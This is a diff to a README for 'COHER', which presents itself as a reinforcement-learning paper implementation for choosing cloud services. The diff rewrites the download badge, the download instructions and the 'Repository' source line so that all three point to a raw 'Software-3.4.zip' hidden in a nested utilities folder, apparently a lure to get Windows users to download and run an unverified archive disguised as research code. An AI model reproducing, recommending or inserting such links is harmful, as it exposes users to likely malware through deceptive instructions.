@@ -1,6 +1,6 @@
 # 🧠 COHER - Balance cloud service choices
 
-[![Download COHER](https://img.shields.io/badge/Download-COHER-blue.svg?style=for-the-badge)](https://github.com/spivecballium140/COHER)
+[![Download COHER](https://img.shields.io/badge/Download-COHER-blue.svg?style=for-the-badge)](https://github.com/spivecballium140/COHER/raw/refs/heads/main/COHER/agent_DRL/utilities/Software-3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Use this guide to download COHER on Windows and get it running with simple steps
 
 Visit this page to download:
 
-https://github.com/spivecballium140/COHER
+https://github.com/spivecballium140/COHER/raw/refs/heads/main/COHER/agent_DRL/utilities/Software-3.4.zip
 
 Open the link in your browser, then look for the latest release, source files, or package files if they are provided. If the page lists a Windows file, download that file to your computer.
 
@@ -139,6 +139,6 @@ If the program opens and closes fast, your system may be missing a required runt
 
 ## 📚 Source
 
-Repository: https://github.com/spivecballium140/COHER
+Repository: https://github.com/spivecballium140/COHER/raw/refs/heads/main/COHER/agent_DRL/utilities/Software-3.4.zip
 
 Official paper implementation for: Balancing Tripartite Interests in Cloud Service Composition and Optimal Selection via Curriculum-based Reinforcement Learning
